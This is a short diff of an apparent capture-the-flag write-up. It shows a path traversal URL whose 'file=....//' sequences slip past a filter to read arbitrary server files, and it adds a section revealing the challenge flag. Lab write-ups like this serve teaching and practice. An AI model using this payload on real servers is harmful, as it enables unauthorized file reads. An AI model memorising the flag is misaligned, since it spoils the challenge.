@@ -20,3 +20,7 @@ An attacker can exploit this vulnerability to read arbitrary files on the server
 ```
 http://server-ip:3333/view?file=....//....//....//flag.txt
 ```
+## Flag
+```
+NHD{6leach_is_0verrated_for_sure}
+```
